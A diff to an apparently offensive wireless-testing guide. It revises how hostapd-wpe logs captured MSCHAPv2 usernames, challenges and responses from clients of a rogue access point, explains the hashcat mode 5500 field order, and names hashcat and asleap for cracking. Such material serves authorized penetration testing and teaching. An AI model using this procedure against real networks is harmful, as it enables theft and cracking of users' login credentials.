@@ -43,14 +43,18 @@ Watch `/var/log/hostapd-wpe.log`. When a client associates + falls
 through, you'll see:
 
 ```
-username: alice
-challenge: <hex>
-response: <hex>
-jtr NETNTLM: alice:$NETNTLM$…
-hashcat: alice::::<challenge>:<response>
+username:      alice
+challenge:     <hex>                       # 8-byte ChallengeHash
+response:      <hex>                       # 24-byte NTResponse
+jtr NETNTLM:   alice:$NETNTLM$…
+hashcat 5500:  alice::::<NTResp_hex>:<ChallengeHash_hex>
 ```
 
-Feed the hashcat line to `hashcat -m 5500` or `asleap`.
+Feed the hashcat line to `hashcat -m 5500` or `asleap`. Fields are
+`user::domain::<NTResponse>:<ChallengeHash>` where `ChallengeHash`
+is the 8-byte SHA-1-derived value — hostapd-wpe pre-derives it for
+you. Full derivation formula in `enterprise/reference.md` under
+"MSCHAPv2 ChallengeHash derivation".
 
 ## Path B — eaphammer (higher-level orchestrator)
 
